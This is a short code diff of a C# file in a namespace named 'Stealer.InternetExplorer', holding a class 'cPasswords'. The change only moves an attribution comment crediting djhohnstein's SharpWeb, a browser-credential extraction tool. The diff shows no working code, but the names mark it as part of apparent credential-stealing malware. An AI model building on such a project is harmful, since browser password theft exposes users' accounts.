@@ -1,13 +1,10 @@
-﻿/* 
-    Author : djhohnstein
-    Github : github.com/djhohnstein/SharpWeb
-*/
-
-using System;
+﻿using System;
 using System.Reflection;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 
+// Author > djhohnstein
+// https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
 namespace Stealer.InternetExplorer
 {
     internal sealed class cPasswords
